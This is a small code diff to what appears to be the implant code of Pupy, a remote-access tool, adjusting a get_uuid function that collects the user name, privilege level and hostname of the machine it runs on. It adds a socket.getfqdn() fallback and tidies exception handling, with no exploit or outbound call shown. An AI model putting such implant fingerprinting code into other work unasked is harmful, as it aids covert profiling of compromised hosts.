@@ -7,6 +7,7 @@ import sys
 import os
 import locale
 import logging
+import socket
 import pupy
 
 import encodings
@@ -262,6 +263,7 @@ def get_uuid():
 
     uacLevel = None
     integrity_level = None
+
     try:
         if sys.platform=="win32":
             user = GetUserName().encode("utf8")
@@ -272,7 +274,6 @@ def get_uuid():
     except Exception as e:
         logging.exception(e)
         user='?'
-        pass
 
     try:
         hostname = platform.node().decode(
@@ -282,6 +283,11 @@ def get_uuid():
         if sys.platform == 'win32' and user.startswith(hostname + '\\'):
             user = user.split('\\', 1)[1]
 
+    except Exception:
+        pass
+
+    try:
+        hostname = socket.getfqdn()
     except Exception:
         pass
 
